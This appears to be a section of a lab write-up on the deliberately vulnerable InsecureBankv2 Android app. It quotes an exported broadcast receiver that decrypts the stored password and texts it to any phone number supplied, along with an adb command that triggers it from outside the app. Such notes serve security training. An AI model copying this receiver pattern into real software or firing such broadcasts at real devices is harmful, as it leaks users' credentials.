## Broadcast Receivers

> app/src/main/AndroidManifest.xml

```
<receiver android:exported="true" android:name="com.android.insecurebankv2.MyBroadCastReceiver">
	<intent-filter>
		<action android:name="theBroadcast"/>
	</intent-filter>
</receiver>
```

> app/src/main/java/com/android/insecurebankv2/ChangePassword.java

```
private void broadcastChangepasswordSMS(String phoneNumber, String pass) {
if(TextUtils.isEmpty(phoneNumber.toString().trim())) {
System.out.println("Phone number Invalid.");
}
else
{
Intent smsIntent = new Intent();
smsIntent.setAction("theBroadcast");
smsIntent.putExtra("phonenumber", phoneNumber);
smsIntent.putExtra("newpass", pass);
sendBroadcast(smsIntent);
}
}
```

> app/src/main/java/com/android/insecurebankv2/MyBroadCastReceiver.java

```
public void onReceive(Context context, Intent intent) {
	String phn = intent.getStringExtra("phonenumber");
	String newpass = intent.getStringExtra("newpass");

	if (phn != null) {
		try {
			SharedPreferences settings = context.getSharedPreferences(MYPREFS, Context.MODE_WORLD_READABLE);
			final String username = settings.getString("EncryptedUsername", null);
			byte[] usernameBase64Byte = Base64.decode(username, Base64.DEFAULT);
			usernameBase64ByteString = new String(usernameBase64Byte, "UTF-8");
			final String password = settings.getString("superSecurePassword", null);
			CryptoClass crypt = new CryptoClass();
			String decryptedPassword = crypt.aesDeccryptedString(password);
			String textPhoneno = phn.toString();
			String textMessage = "Updated Password from: "+decryptedPassword+" to: "+newpass;
			SmsManager smsManager = SmsManager.getDefault();
			System.out.println("For the changepassword - phonenumber: "+textPhoneno+" password is: "+textMessage);
			smsManager.sendTextMessage(textPhoneno, null, textMessage, null, null);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	else {
		System.out.println("Phone number is null");
	}
}
```

- `adb shell am broadcast -n com.android.insecurebankv2/.MyBroadCastReceiver -a theBroadcast --es phonenumber 5554 --es newpass hacked`

